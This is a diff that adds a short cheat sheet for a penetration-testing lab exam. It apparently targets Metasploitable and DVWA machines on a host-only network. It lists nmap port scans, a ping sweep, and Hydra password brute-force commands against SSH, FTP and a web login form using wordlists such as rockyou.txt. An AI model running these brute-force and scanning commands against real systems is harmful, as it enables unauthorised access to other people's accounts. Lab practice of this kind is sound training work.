@@ -1,0 +1,30 @@
+=====================================================
+HYDRA MANUAL COMMANDS CHEAT SHEET FOR LAB EXAM
+=====================================================
+
+1. TARGET RECONNAISSANCE (PORTS CHECK):
+   nmap -p 21,22,80 <TARGET_IP>
+
+2. SSH ATTACK (USING FAST WORDLIST):
+   hydra -l msfadmin -P passwords.txt ssh://<TARGET_IP> -t 4
+
+3. SSH ATTACK (USING ROCKYOU.TXT):
+   hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4
+
+4. FTP ATTACK (USING MULTIPLE USERS & PASSWORDS):
+   hydra -L users.txt -P passwords.txt ftp://<TARGET_IP> -t 4
+
+5. HTTP POST WEB FORM ATTACK (DVWA):
+   hydra -l admin -P passwords.txt <TARGET_IP> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid username"
+=====================================================
+
+=====================================================
+EXPERIMENT 3: PING SWEEP (HOST DISCOVERY)
+=====================================================
+
+1. METHOD 1: NMAP PING SCAN (-sn)
+   sudo nmap -sn 192.168.56.0/24
+
+2. METHOD 2: BASH FOR-LOOP PING
+   for ip in 192.168.56.{1..254}; do ping -c 1 -W 1 $ip >/dev/null && echo "$ip is up"; done
+=====================================================
